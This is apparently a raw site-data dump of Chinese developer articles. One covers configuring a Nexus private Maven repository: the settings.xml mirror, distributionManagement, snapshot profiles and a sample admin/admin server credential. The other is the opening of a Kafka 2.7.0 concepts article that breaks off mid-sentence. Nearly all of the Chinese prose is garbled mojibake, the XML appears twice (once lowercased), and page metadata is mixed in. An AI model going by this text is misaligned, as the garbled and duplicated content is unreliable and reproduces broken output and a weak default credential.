<groupId>org.example</groupId>\n    <artifactId>demoJar</artifactId>\n    \x3c!-- åç¼ SNAPSHOT å°±ä¼æ jar åå¸å° nexus repositoryç maven-snapshots --\x3e\n    <version>1.0-SNAPSHOT</version>\n\n    <properties>\n        <maven.compiler.source>8</maven.compiler.source>\n        <maven.compiler.target>8</maven.compiler.target>\n    </properties>\n\n    \x3c!-- éç½® nexus --\x3e\n    <distributionManagement>\n        <repository>\n            \x3c!-- è¿éçidéçº¦ setting.xml éç½®çidç¸å --\x3e\n            <id>nexus</id>\n            \x3c!-- éç½®åå¸ççåç§°ä¸è·¯å¾ --\x3e\n            <name>Nexus Release Repository</name>\n            <url>>http://10.240.30.93:9527/repository/maven-releases/</url>\n        </repository>\n        <snapshotRepository>\n            <id>nexus</id>\n            <name>Nexus Snapshot Repository</name>\n            <url>http://10.240.30.93:9527/repository/maven-snapshots/</url>\n        </snapshotRepository>\n    </distributionManagement>\n\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\néç½®å®æåï¼åå¥½çä½ çå·¥å·ç±»ï¼ç¶åå¯¹å¶è¿è¡ maven åçåå¸\n\n\n\n\n\n\n\nç¶åè®©ä½ çåäºè¿è¡ä¾èµå¼å¥ï¼å°±å¯ä»¥è°ç¨ä½ çæ¹æ³äºã\n\n<dependency>\n    <groupId>org.example</groupId>\n    <artifactId>demoJar</artifactId>\n    <version>1.0-SNAPSHOT</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n> ç¸åçæ¬ç jar é»è®¤æ¯ä¸è½éå¤åå¸å° nexus ä¸­çï¼å¯ä»¥ä¿®æ¹ä½ è¦åå¸å°åçéç½®ï¼æ¹ä¸º Allow redeploy\n\n\n\n> å¦æåç°èªå·±ä¸ä¼ çåï¼ç¡®å®æ è¯¯åæ æ³ä¸è½½ä¾èµï¼ä¸ç®¡æ¯èªå·±è¿æ¯å«äººï¼é£ä¹å¯è½åå æ¯ Maven åç½®çæä»¶è¿ç¨ä»åºéç½®ï¼å³é­äºå¯¹ SNAPSHOT çæ¯æï¼é²æ­¢ä¸ç¨³å®çæå»ºãæä»¥è§£å³åæ³æå³é®çæ¯ï¼å¨ maven ç conf ç®å½ä¸ç setting.xml æä»¶ä¸­ï¼æ·»å  å¯¹ SNAPSHOT çæ¯æ\n\n<snapshots>\nãã<enabled>true</enabled>\n</snapshots>\n\n\n1\n2\n3\n\n\nå¨ä½  maven setting.xml éå ï¼æè pom.xml éå é½è¡\n\n<profiles>\n    <profile>\n        <id>central-repo</id>\n        <repositories>\n            <repository>\n                <id>central</id>\n                <name>Central-repo</name>\n                <url>http://******/central</url>\n                <releases>\n                    <enabled>true</enabled>\n                </releases>\n                <snapshots>\n                    <enabled>true</enabled>\n                </snapshots>\n            </repository>\n        </repositories>\n    </profile>\n</profiles>\n\n<activeProfiles>\n    <activeProfile>central-repo</activeProfile>\n</activeProfiles>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\nå¦æéè¦æ·»å ä¸¤ä¸ªå¯ä»¥æ¯\n\n<profile>\n    <repositories>\n        <repository>\n            <releases>\n                <enabled>true</enabled>\n            </releases>\n            <snapshots>\n                <enabled>false</enabled>\n            </snapshots>\n            <id>releases</id>\n            <name>release</name>\n            <url>http://***********/maven-releases/</url>\n        </repository>\n        <repository>\n            <releases>\n                <enabled>false</enabled>\n            </releases>\n            <snapshots>\n                <enabled>true</enabled>\n            </snapshots>\n            <id>snapshots</id>\n            <name>libs-snapshot</name>\n            <url>http://***************/maven-snapshots/</url>\n        </repository>\n    </repositories>\n    <id>artifactory</id>\n</profile>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n',normalizedContent:'ä¸è½½å°å https://help.sonatype.com/repomanager3/product-information/downloadï¼ä¸è½½å¥½åè¿è¡è§£åç¼©ä¼å¾å°ä¸¤ä¸ªæä»¶ï¼nexus-3.39.0-01 å sonatype-workãå¯ä»¥éç½® nexus åéå°æä»¬çç¯å¢ä¸­æ¹ä¾¿å¯å¨ï¼ä¹å¯ä»¥ä¸éç½®æ¯æ¬¡é½å° nexus-3.39.0-01/bin ä¸å»å¯å¨ã\n\nnexus_home: /opt/software/nexus3/nexus-3.39.0-01/\npath: %nexus_home%/bin\n\n\n1\n2\n\n\nnexus é»è®¤ä½¿ç¨çæ¯ 8081 ç«¯å£ï¼å¾å¤å¾®æå¡çç«¯å£é½ä¼ä» 8080 ç­å¼å§ä½¿ç¨ï¼å¯ä»¥ä¿®æ¹ nexus çç«¯å£ï¼å·ä½ä½ç½®æä»¶ä¸º /opt/software/nexus3/nexus-3.39.0-01/etc/nexus-default.properties\n\nå¯å¨ nexus å½ä»¤\n\n./nexus {start|stop|run|run-redirect|status|restart|force-reload}\n\n# æç¤ºä¿¡æ¯\nwarning: ************************************************************\nwarning: detected execution as "root" user.  this is not recommended!\nwarning: ************************************************************\n\n# è¿ä¸ªä¿¡æ¯éè¦ä¿®æ¹ /opt/software/nexus3/nexus-3.39.0-01/bin/nexus æä»¶ï¼æ¾å° run_as_root=trueï¼æ¹ä¸ºå¦ä¸\nrun_as_root=false\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nå¯å¨æååå°±å¯ä»¥ç»å½ nexus ææä¾çå®¢æ·ç«¯çé¢ï¼ç»å½çæ¶åä¼é®ä½ è¦è´¦å·å¯ç ï¼è´¦å·é»è®¤æ¯ adminï¼å¯ç å¨ /opt/software/nexus3/sonatype-work/nexus3/admin.password æä»¶ä¸­ï¼ç»å½æååä¼è¦æ±æ´æ¹å¯ç ï¼å¯ç æ´æ¹å admin.password ä¼èªå¨å é¤ãä¿®æ¹ä¼ä¼è®©ä½ éæ©ä¸¥æ ¼æ¨¡å¼ï¼å»ºè®®åè®¸ææäººè®¿é®ï¼æ¯ç«æ¯ç§ææ²¡å¤ªå¤§å¿è¦ä¸¥æ ¼ã\n\n\n\n\n\n\n\nç¹å»è®¾ç½®ãç¹å»ä»åºï¼æä»¬å¯ä»¥çå°ä»åºç®¡çéç½®åè¡¨ï¼å¶ä¸­è· maven ç¸å³çæ 4 ä¸ªï¼maven ç¸å¯¹æ 3 ä¸ª type\n\n * proxyï¼è¡¨ç¤ºä¸ºä»£çä»åºï¼ä¸è½½ç»ä»¶æ¶ï¼å¦æä»£çä»åºæç´¢ä¸å°ï¼åæè¯·æ±è½¬åå°è¿ç¨ä»åºï¼é»è®¤ https://repo1.maven.org/maven2/ï¼è¯¥å°åå¯ä»¥ä¿®æ¹ï¼ï¼å¹¶ä»è¿ç¨ä»åºä¸è½½ï¼ç¶åå°è¯¥ç»ä»¶ç¼å­å°ä»£çåºï¼å½åæ¬¡è¯·æ±è¯¥ç»ä»¶æ¶ï¼åç´æ¥å°ä»£çä»åºä¸è½½ï¼ä¸ä¼åä»è¿ç¨ä»åºä¸è½½ã\n * hosted\n   è¡¨ç¤ºå®¿ä¸»ä»åºï¼ä¸»è¦ç¨æ¥é¨ç½²å¢éåé¨ç»ä»¶ï¼å¶ä¸­ maven-releases ç¨æ¥é¨ç½²å¢éåé¨çåå¸çç»ä»¶ï¼maven-snapshots ç¨æ¥é¨ç½²å¢éåé¨çå¿«ç§çç»ä»¶ã\n * group\n   è¡¨ç¤ºåç»ä»åºï¼é»è®¤å° maven-centralãmaven-releasesãmaven-snapshots ä¸ä¸ªä»åºç»åå¨ä¸èµ·å¯¹å¤æä¾æå¡ï¼ç®åäº maven å®¢æ·ç«¯å¨ setting.xml æ pom.xml çéç½®\n\nä¿®æ¹ maven-central ç proxy å°åï¼ä½ å¯ä»¥å¨åè¡¨ä¸­ç¹å» maven-centralï¼å°±ä¼è¿å° maven-central çç¼è¾é¡µï¼ç¶åå¨ remote storage ä¿®æ¹ä¸ºé¿éäºçä»åºç¹å»ä¿å­å³å¯ã\n\nhttps://maven.aliyun.com/nexus/content/groups/public/\n\n\n1\n\n\n\n\nmaven æ³ä½¿ç¨æä»¬èªå·±æ­å»ºç nexusï¼åªéè¦å¨ maven-3.8.4\\conf\\settings.xml æä»¶ä¿®æ¹éåå°åå³å¯\n\n  <mirrors>\n\t\x3c!-- é¿éäº --\x3e\n\t\x3c!--\n    <mirror>\n      <id>alimaven</id>\n      <name>aliyun maven</name>\n      <url>https://maven.aliyun.com/nexus/content/groups/public/</url>\n      <mirrorof>central</mirrorof>\n    </mirror>\n\t--\x3e\n    <mirror>\n      <id>nexus</id>\n      <mirrorof>*</mirrorof>\n      <url>http://10.240.30.93:9527/repository/maven-public/</url>\n    </mirror>\n  </mirrors>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n> æç§ä»¥ä¸çæä½ï¼æä»¬åªæ°å¯å¨ä¸ä¸ªé¡¹ç®ï¼å¹¶å¨é¡¹ç®ä¸­æå®è¯¥ mavenï¼æ­¤æ¶æä»¬ä¸è½½ç jar å°±ä¼ç¼å­å° nexus éï¼å½å¶ä»åäºä½¿ç¨è¯¥é¡¹ç®å°±ä¼åç°è¯¥é¡¹ç®çä¾èµä¸è½½ä¸ºæä»¬ nexus çé¨ç½²å°åã\n\nä½æ¯è¿è¿ä¸å¤ï¼å¨å®éå¼åä¸­ï¼é¤äºæä»¬æ¬èº«ä½¿ç¨çç¬¬ä¸æ¹ä¾èµå¤ï¼æä»¬èªå·±ä¹ä¼åä¸äºä¾èµåæå·¥å·åç­ï¼æ­¤æ¶è¥æ³è®©å¶ä»åäºå¯ä»¥ä¸è½½å¹¶ä¾èµä½¿ç¨ï¼æä»¬å°±éè¦ææä»¬å¶ä½ç jar åå¸å° nexus éå»ãæä»¬åè¦å¨æä»¬ç maven ç settings.xml ä¸­éç½®å¨ nexus çè´¦å·å¯ç \n\n  <servers>\n    <server>\n      \x3c!-- æ³¨æid  nexus--\x3e\n      <id>nexus</id>\n      <username>admin</username>\n      <password>admin</password>\n    </server>\t\n  </servers>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nä¹åæä»¬åªéè¦åå»ºæä»¬ç jar å¹¶æ·»å ä¸äºéç½®å³å¯ï¼ç¸åºéç½®å¨ä»£ç ä¸­æè¯´æ\n\n<?xml version="1.0" encoding="utf-8"?>\n<project xmlns="http://maven.apache.org/pom/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n         xsi:schemalocation="http://maven.apache.org/pom/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelversion>4.0.0</modelversion>\n\n    <groupid>org.example</groupid>\n    <artifactid>demojar</artifactid>\n    \x3c!-- åç¼ snapshot å°±ä¼æ jar åå¸å° nexus repositoryç maven-snapshots --\x3e\n    <version>1.0-snapshot</version>\n\n    <properties>\n        <maven.compiler.source>8</maven.compiler.source>\n        <maven.compiler.target>8</maven.compiler.target>\n    </properties>\n\n    \x3c!-- éç½® nexus --\x3e\n    <distributionmanagement>\n        <repository>\n            \x3c!-- è¿éçidéçº¦ setting.xml éç½®çidç¸å --\x3e\n            <id>nexus</id>\n            \x3c!-- éç½®åå¸ççåç§°ä¸è·¯å¾ --\x3e\n            <name>nexus release repository</name>\n            <url>>http://10.240.30.93:9527/repository/maven-releases/</url>\n        </repository>\n        <snapshotrepository>\n            <id>nexus</id>\n            <name>nexus snapshot repository</name>\n            <url>http://10.240.30.93:9527/repository/maven-snapshots/</url>\n        </snapshotrepository>\n    </distributionmanagement>\n\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\néç½®å®æåï¼åå¥½çä½ çå·¥å·ç±»ï¼ç¶åå¯¹å¶è¿è¡ maven åçåå¸\n\n\n\n\n\n\n\nç¶åè®©ä½ çåäºè¿è¡ä¾èµå¼å¥ï¼å°±å¯ä»¥è°ç¨ä½ çæ¹æ³äºã\n\n<dependency>\n    <groupid>org.example</groupid>\n    <artifactid>demojar</artifactid>\n    <version>1.0-snapshot</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n> ç¸åçæ¬ç jar é»è®¤æ¯ä¸è½éå¤åå¸å° nexus ä¸­çï¼å¯ä»¥ä¿®æ¹ä½ è¦åå¸å°åçéç½®ï¼æ¹ä¸º allow redeploy\n\n\n\n> å¦æåç°èªå·±ä¸ä¼ çåï¼ç¡®å®æ è¯¯åæ æ³ä¸è½½ä¾èµï¼ä¸ç®¡æ¯èªå·±è¿æ¯å«äººï¼é£ä¹å¯è½åå æ¯ maven åç½®çæä»¶è¿ç¨ä»åºéç½®ï¼å³é­äºå¯¹ snapshot çæ¯æï¼é²æ­¢ä¸ç¨³å®çæå»ºãæä»¥è§£å³åæ³æå³é®çæ¯ï¼å¨ maven ç conf ç®å½ä¸ç setting.xml æä»¶ä¸­ï¼æ·»å  å¯¹ snapshot çæ¯æ\n\n<snapshots>\nãã<enabled>true</enabled>\n</snapshots>\n\n\n1\n2\n3\n\n\nå¨ä½  maven setting.xml éå ï¼æè pom.xml éå é½è¡\n\n<profiles>\n    <profile>\n        <id>central-repo</id>\n        <repositories>\n            <repository>\n                <id>central</id>\n                <name>central-repo</name>\n                <url>http://******/central</url>\n                <releases>\n                    <enabled>true</enabled>\n                </releases>\n                <snapshots>\n                    <enabled>true</enabled>\n                </snapshots>\n            </repository>\n        </repositories>\n    </profile>\n</profiles>\n\n<activeprofiles>\n    <activeprofile>central-repo</activeprofile>\n</activeprofiles>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\nå¦æéè¦æ·»å ä¸¤ä¸ªå¯ä»¥æ¯\n\n<profile>\n    <repositories>\n        <repository>\n            <releases>\n                <enabled>true</enabled>\n            </releases>\n            <snapshots>\n                <enabled>false</enabled>\n            </snapshots>\n            <id>releases</id>\n            <name>release</name>\n            <url>http://***********/maven-releases/</url>\n        </repository>\n        <repository>\n            <releases>\n                <enabled>false</enabled>\n            </releases>\n            <snapshots>\n                <enabled>true</enabled>\n            </snapshots>\n            <id>snapshots</id>\n            <name>libs-snapshot</name>\n            <url>http://***************/maven-snapshots/</url>\n        </repository>\n    </repositories>\n    <id>artifactory</id>\n</profile>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n',charsets:{cjk:!0}},{title:"kafka-2.7.0 åºæ¬æ¦å¿µ",frontmatter:{title:"kafka-2.7.0 åºæ¬æ¦å¿µ",date:"2023-06-25T09:22:36.000Z",permalink:"/kafka/1400",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/02.%E4%B8%AD%E9%97%B4%E4%BB%B6/01.kafka/1400.kafka-2.7.0%20%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.html",relativePath:"02.ä¸­é´ä»¶/01.kafka/1400.kafka-2.7.0 åºæ¬æ¦å¿µ.md",key:"v-3d328794",path:"/kafka/1400/",headers:[{level:2,title:"æ¦å¿µ",slug:"æ¦å¿µ",normalizedTitle:"æ¦å¿µ",charIndex:2},{level:2,title:"kafka å¯æ¬ååº",slug:"kafka-å¯æ¬ååº",normalizedTitle:"kafka å¯æ¬ååº",charIndex:1308},{level:2,title:"kafkaçäº§",slug:"kafkaçäº§",normalizedTitle:"kafka çäº§",charIndex:1525},{level:3,title:"kafka Leader éä¸¾",slug:"kafka-leader-éä¸¾",normalizedTitle:"kafka leader éä¸¾",charIndex:1974},{level:2,title:"kafka æ¶è´¹æ¨¡å¼",slug:"kafka-æ¶è´¹æ¨¡å¼",normalizedTitle:"kafka æ¶è´¹æ¨¡å¼",charIndex:2507},{level:3,title:"offsetæºå¶",slug:"offsetæºå¶",normalizedTitle:"offset æºå¶",charIndex:3297},{level:2,title:"kafka ç´¢å¼æºå¶",slug:"kafka-ç´¢å¼æºå¶",normalizedTitle:"kafka ç´¢å¼æºå¶",charIndex:4128},{level:2,title:"kafkaçæ¶æ¯ç³»ç»è¯­ä¹",slug:"kafkaçæ¶æ¯ç³»ç»è¯­ä¹",normalizedTitle:"kafka çæ¶æ¯ç³»ç»è¯­ä¹",charIndex:4636},{level:3,title:"è³å°ä¸æ¬¡è¯­ä¹ï¼at least once semanticsï¼all æ -1",slug:"è³å°ä¸æ¬¡è¯­ä¹-at-least-once-semantics-all-æ-1",normalizedTitle:"è³å°ä¸æ¬¡è¯­ä¹ï¼at least once semanticsï¼all æ -1",charIndex:4790},{level:4,title:"çäº§",slug:"çäº§",normalizedTitle:"çäº§",charIndex:1531},{level:4,title:"æ¶è´¹",slug:"æ¶è´¹",normalizedTitle:"æ¶è´¹",charIndex:550},{level:3,title:"è³å¤ä¸æ¬¡è¯­ä¹ï¼at most once semanticsï¼0",slug:"è³å¤ä¸æ¬¡è¯­ä¹-at-most-once-semantics-0",normalizedTitle:"è³å¤ä¸æ¬¡è¯­ä¹ï¼at most once semanticsï¼0",charIndex:5204},{level:4,title:"çäº§",slug:"çäº§-2",normalizedTitle:"çäº§",charIndex:1531},{level:4,title:"æ¶è´¹",slug:"æ¶è´¹-2",normalizedTitle:"æ¶è´¹",charIndex:550},{level:3,title:"ç²¾ç¡®ä¸æ¬¡è¯­ä¹ï¼Exactly once semanticsï¼",slug:"ç²¾ç¡®ä¸æ¬¡è¯­ä¹-exactly-once-semantics",normalizedTitle:"ç²¾ç¡®ä¸æ¬¡è¯­ä¹ï¼exactly once semanticsï¼",charIndex:5436},{level:4,title:"çäº§",slug:"çäº§-3",normalizedTitle:"çäº§",charIndex:1531},{level:4,title:"æ¶è´¹",slug:"æ¶è´¹-3",normalizedTitle:"æ¶è´¹",charIndex:550}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"æ¦å¿µ kafka å¯æ¬ååº kafkaçäº§ kafka Leader éä¸¾ kafka æ¶è´¹æ¨¡å¼ offsetæºå¶ kafka ç´¢å¼æºå¶ kafkaçæ¶æ¯ç³»ç»è¯­ä¹ è³å°ä¸æ¬¡è¯­ä¹ï¼at least once semanticsï¼all æ -1 çäº§ æ¶è´¹ è³å¤ä¸æ¬¡è¯­ä¹ï¼at most once semanticsï¼0 çäº§ æ¶è´¹ ç²¾ç¡®ä¸æ¬¡è¯­ä¹ï¼Exactly once semanticsï¼ çäº§ æ¶è´¹",content:"# æ¦å¿µ\n\n 1. Kafka å¹¶æ²¡æå®å¨éµç§ JMS èï¼å®å¦è¾è¹å¾ï¼æ¢ç´¢åºäºä¸æ¡ç¬æçéè·¯\n 2. kafka æ¯ææ¶æ¯åå°é¡µç¼å­ä¸­ï¼ç¶åç±æä½ç³»ç»èªè¡å³å®ä»ä¹æ¶åæé¡µç¼å­ä¸­çæ°æ®ååç£çä¸ï¼è¿æ ·çè®¾è®¡æ 3 ä¸ªä¸»è¦ä¼å¿ï¼\n\n * æä½ç³»ç»é¡µç¼å­æ¯å¨åå­ä¸­åéçï¼æä»¥æ¶æ¯åå¥çéåº¦éå¸¸å¿«ã\n * Kafka ä¸å¿ç´æ¥ä¸åºå±çæä»¶ç³»ç»æäº¤éãææç¦çç 1/0 æä½é½äº¤ç±æä½ç³»ç»æ¥å¤ç\n * Kafka åå¥æä½éç¨è¿½å åå¥ï¼ append ï¼çæ¹å¼ï¼é¿åäºç£çéæºåæä½ï¼ä¸ä¸åè®¸ä¿®æ¹å·±åå¥çæ¶æ¯ï¼å æ­¤å®å±äºå¸åçç£çé¡ºåºè®¿é®åæä½ãæ®éçç£çé¡ºåºåå¥ è· åå­éæºåå¥æè¿ä¹èæ ä¸åã\n\n 3. Kafka å°±æ¯ä¾é ä¸å 4 ç¹è¾¾å°äºé«ååéãä½å»¶æ¶çè®¾è®¡ç®æ çã\n\n * å¤§éä½¿ç¨æä½ç³»ç»é¡µç¼å­ï¼åå­æä½éåº¦å¿«ä¸å½ä¸­çé«ã\n * Kafka ä¸ç´æ¥åä¸ç©ç 1/0 æä½ï¼èæ¯äº¤ç±ææé¿æ­¤äºçæä½ç³»ç»æ¥å®æã\n * éç¨è¿½å åå¥æ¹å¼ï¼æå¼äºç¼æ¢çç£çéæºè¯»ï¼åæä½ã\n * ä½¿ç¨ä»¥ sendfile ä¸ºä»£è¡¨çé¶æ·è´ææ¯å å¼ºç½ç»é´çæ°æ®ä¼ è¾æçãä¸¥æ ¼æ¥è¯´æ¯éè¿ Java ç FileChannel.transferTo æ¹æ³å®ç°çã\n\n 4. Kafka ä¸­ç topic éå¸¸é½ä¼è¢«å¤ä¸ªæ¶è´¹èè®¢éï¼å æ­¤åºäºæ§è½çèéï¼ Kafka å¹¶ä¸æ¯ topicmessage çä¸¤çº§ç»æï¼èæ¯éç¨äº topic-partition-message çä¸çº§ç»ææ¥åæ£è´è½½ã\n 5. topic partition ä¸çæ¯æ¡æ¶æ¯é½è¢«åéä¸ä¸ªä½ç§»å¼ãå®éä¸ Kafka æ¶è´¹èç«¯ä¹æä½ç§»ï¼ offset ï¼çæ¦å¿µï¼ä½æ³¨æè¿ä¸¤ä¸ª offset å±äºä¸åçæ¦å¿µãæ¯æ¡æ¶æ¯å¨æä¸ª partition ä½ç§»æ¯åºå®çï¼ä½æ¶è´¹è¯¥ partition çæ¶è´¹èçä½ç§»ä¼éçæ¶è´¹è¿åº¦ (åæè¦æäº¤ offset) ä¸æ­åç§»ã\n 6. å¯¹äºæ¯æ¡å¾åè¿­çæ¶æ¯ï¼å¦æè¯¥æ¶æ¯æå®äº key ï¼é£ä¹è¯¥ partitioner ä¼æ ¹æ® key çåå¸å¼æ¥éæ©ç®æ ååºï¼è¥è¿æ¡æ¶æ¯æ²¡ææå® key ï¼å partitioner ä½¿ç¨è½®è¯¢çæ¹å¼ç¡®è®¤ç®æ ååºä¸ä¸è¿æ ·å¯ä»¥æå¤§éåº¦å°ç¡®ä¿æ¶æ¯å¨ææååºä¸çååæ§\n 7. æ¶è´¹èç offset æ²¡ææäº¤çè¯ï¼ä¸æ¬¡å¯å¨ä¼ä»æ²¡æäº¤çå°æ¹å¼å§è¯»\n 8. kafka çå¹¿æ­æ¨¡å¼ï¼ä¸ä¸ª topic å¯ä»¥è¢«å¤ä¸ªç»çä¸ä¸ªæ¶è´¹èè¿è¡æ¶è´¹ï¼è¿æ ·å°±å®ç°äºå¹¿æ­æ¨¡å¼ãä¹å°±æ¯ç»ä¸ç»ä¹é´å±äº«æ°æ®ï¼ä½ç»åçæ¶è´¹èç«äºæ¶è´¹ã\n 9. kafka æ¶è´¹è¿çæ°æ®ä¾æ§ä¼ä¿çå¨æä»¶ï¼å¯ä»¥éè¿ä¸¤ç§æ¹å¼å é¤æ§æ°æ®ãä¸¤ç§æ¹å¼é½å¯ä»¥éè¿ä¿®æ¹ vim KAFKA_HOME/config/server.properties çéç½®æä»¶æ¥è®¾ç½®ã\n\n * å¯ä»¥åºäºæ¶é´éç½®ï¼è®© kafka å é¤ä¸å¨åçæ°æ®ã\n\n# åä½å°æ¶\nlog.retention.hours=168\n\n\n1\n2\n\n * ä¹å¯ä»¥å¨ Partition æä»¶è¶è¿ 1GB æ¶å é¤æ§æ°æ®\n\n# åä½å­è\nlog.segment.bytes=1073741824\n\n\n1\n2\n\n\n\n# kafka å¯æ¬ååº\n\n\n\nkafka çååºï¼å¨éç¾¤æ¨¡å¼ä¸ï¼ä¼åååå¸å°æ¯ä¸ªéç¾¤èç¹ã\n\nkafka çå¯æ¬æçæ¯ååºçå¯æ¬ãå¯æ¬æ°éä¸è½è¶è¿ éç¾¤èç¹ çæ°é\n\nkafka éç¾¤æ¯æ²¡æ leader ä¸è¯´çï¼ä½å¯¹äº ååºå¯æ¬ æ¯æ leader çãæ¢ç¶æ leader é£ä¹è¯å®æéä¸¾æºå¶ï¼kafka ä¼å¨éç¾¤ä¸­çéæºä¸ä¸ª broker (èç¹) å¼å¯ä¸ä¸ª controller è¿ç¨ï¼ç¨æ¥è¿è¡ leader çéä¸¾ã\n\n\n# kafka çäº§\n\n\n\n 1. producer åä» zookeeper ç */brokers/.../state èç¹æ¾å°è¯¥ partition ç Leader\n 2. producer å°æ¶æ¯åéç» Leader\n 3. leader å°æ¶æ¯åå°æ¬å° log\n 4. follower ä» leader æ¹éæåæ¶æ¯ï¼åå¥æ¬å° logï¼æåå leader åé ACK\n 5. leader æ¶å°ææ replica ç ACK åï¼å¢å  HW (high watemarkï¼æå commit ç offset) å¹¶å producer åé ACKã\n    æé´æ ISR æºå¶ï¼ISR æ¯æï¼æ¯å¦æä¸ä¸ªåå¸â â¡â¢ï¼å¶ä¸­â¡æ¯ leaderï¼â â¢æ¯ followerãåè®¾å¨æ°æ®åæ­¥è¿ç¨ä¸­ï¼â è·ä¸ leaderï¼ä½æ¯â¢åºç°æéæ²¡æåæ­¥ï¼åâ â¡æ¯ä¸ä¸ª ISRï¼èâ¢ä¸æ¯ ISR æåãåæå¨ Leader éä¸¾æ¶ï¼ä¼ç¨å° ISR æºå¶ï¼ä¼åä» ISR ä¸­éæ© Leaderã\n\n\n# kafka Leader éä¸¾\n\nè¿éæè°ç HA æå¾å°±æ¯å¯¹ partition ç HAï¼åªæ partition æ Leader å follower æºå¶ï¼æä»¥ Leader æäºä¹åè¦éæ°éä¸¾ Leaderãå¨éä¸¾æ° Leader æ¶ï¼ä¸ä¸ªåºæ¬ååæ¯ï¼æ°ç Leader å¿é¡»æ¥ææ§ç Leader commit è¿çæææ¶æ¯ã\n\nç±åå¥æµç¨å¯ç¥ ISR éé¢çææ replication é½è·ä¸äº Leaderï¼åªæ ISR éé¢çæåæè½éä¸º Leaderãå¯¹äº f+1 ä¸ª replicationï¼ä¸ä¸ª partition å¯ä»¥å®¹å¿ f ä¸ª replication å¤±æçæåµä¸ä¿è¯æ¶æ¯ä¸ä¸¢å¤±ãæ¯å¦ä¸ä¸ªååº 5 ä¸ªå¯æ¬ï¼æäº 4 ä¸ªï¼è¿æä¸ä¸ªï¼ä¾ç¶å¯ä»¥å·¥ä½ã\n\nå½ææ replication é½ä¸å·¥ä½æ¶ï¼æä¸¤ç§å¯è¡çæ¹æ¡ï¼kafka0.8* ä»¥åé»è®¤ä½¿ç¨ç¬¬äºç§\n\n 1. ç­å¾ ISR ä¸­çä»»ä¸ä¸ª replication æ´»è¿æ¥ï¼å¹¶éå®åä¸º Leaderãå¯ä¿éæ°æ®ä¸ä¸¢å¤±ï¼ä½æ¶é´å¯è½ç¸å¯¹è¾é¿ã\n 2. éæ©ç¬¬ä¸ä¸ªæ´»è¿æ¥ç replicationï¼ä¸ä¸å®æ¯ ISR æåï¼ä½ä¸º Leaderãæ æ³ä¿éæ°æ®ä¸ä¸¢å¤±ï¼ä½ç¸å¯¹ä¸å¯ç¨æ¶é´è¾ç­ã\n\n\n# kafka æ¶è´¹æ¨¡å¼\n\né¦åæç¡®ä¸ç¹ï¼kafka ä½¿ç¨çæ¯ pullï¼æåï¼ æ¨¡å¼ã\n\nKafka æåèèçé®é¢æ¯ï¼customer åºè¯¥ä» brokes æåæ¶æ¯è¿æ¯ brokers å°æ¶æ¯æ¨éå° consumerï¼ä¹å°±æ¯ pull è¿ pushãå¨è¿æ¹é¢ï¼Kafka éµå¾ªäºä¸ç§å¤§é¨åæ¶æ¯ç³»ç»å±åçä¼ ç»çè®¾è®¡ï¼producer å°æ¶æ¯æ¨éå° brokerï¼consumer ä» broker æåæ¶æ¯ã\n\nä¸äºæ¶æ¯ç³»ç»æ¯å¦ Scribe å Apache Flume éç¨äº push æ¨¡å¼ï¼å°æ¶æ¯æ¨éå°ä¸æ¸¸ç consumerãè¿æ ·åæå¥½å¤ä¹æåå¤ï¼ç± broker å³å®æ¶æ¯æ¨éçéçï¼å¯¹äºä¸åæ¶è´¹éçç consumer å°±ä¸å¤ªå¥½å¤çäºãæ¶æ¯ç³»ç»é½è´åäºè®© consumer ä»¥æå¤§çéçæå¿«éçæ¶è´¹æ¶æ¯ï¼ä½ä¸å¹¸çæ¯ï¼push æ¨¡å¼ä¸ï¼å½ broker æ¨éçéçè¿å¤§äº consumer æ¶è´¹çéçæ¶ï¼consumer ææå°±è¦å´©æºäºãæç» Kafka è¿æ¯éåäºä¼ ç»ç pull æ¨¡å¼ãPull æ¨¡å¼çå¦å¤ä¸ä¸ªå¥½å¤æ¯ consumer å¯ä»¥èªä¸»å³å®æ¯å¦æ¹éçä» broker æåæ°æ®ãPush æ¨¡å¼å¿é¡»å¨ä¸ç¥éä¸æ¸¸ consumer æ¶è´¹è½ååæ¶è´¹ç­ç¥çæåµä¸å³å®æ¯ç«å³æ¨éæ¯æ¡æ¶æ¯è¿æ¯ç¼å­ä¹åæ¹éæ¨éãå¦æä¸ºäºé¿å consumer å´©æºèéç¨è¾ä½çæ¨ééçï¼å°å¯è½å¯¼è´ä¸æ¬¡åªæ¨éè¾å°çæ¶æ¯èé ææµªè´¹ãPull æ¨¡å¼ä¸ï¼consumer å°±å¯ä»¥æ ¹æ®èªå·±çæ¶è´¹è½åå»å³å®è¿äºç­ç¥ãPull æä¸ªç¼ºç¹æ¯ï¼å¦æ broker æ²¡æå¯ä¾æ¶è´¹çæ¶æ¯ï¼å°å¯¼è´ consumer ä¸æ­å¨å¾ªç¯ä¸­è½®è¯¢ï¼ç´å°æ°æ¶æ¯å°è¾¾ãä¸ºäºé¿å